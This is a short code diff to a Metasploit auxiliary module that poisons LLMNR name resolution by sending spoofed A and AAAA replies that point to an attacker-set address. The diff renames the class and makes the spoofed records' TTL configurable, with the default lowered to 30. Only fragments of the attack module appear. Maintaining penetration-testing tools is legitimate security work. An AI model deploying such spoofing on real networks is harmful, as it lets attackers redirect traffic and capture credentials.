@@ -8,7 +8,7 @@ require 'socket'
 require 'ipaddr'
 require 'net/dns'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
 include Msf::Exploit::Capture
 
@@ -44,7 +44,7 @@ attr_accessor :sock, :thread
     register_options([
       OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
       OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
-      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 300]),
+      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 30]),
     ])
 
     deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
@@ -85,7 +85,7 @@ attr_accessor :sock, :thread
       when ::Net::DNS::A
         dns_pkt.answer << ::Net::DNS::RR::A.new(
           :name => name,
-          :ttl => 30,
+          :ttl => datastore['TTL'],
           :cls => ::Net::DNS::IN,
           :type => ::Net::DNS::A,
           :address => spoof.to_s
@@ -93,7 +93,7 @@ attr_accessor :sock, :thread
       when ::Net::DNS::AAAA
         dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
           :name => name,
-          :ttl => 30,
+          :ttl => datastore['TTL'],
           :cls => ::Net::DNS::IN,
           :type => ::Net::DNS::AAAA,
           :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
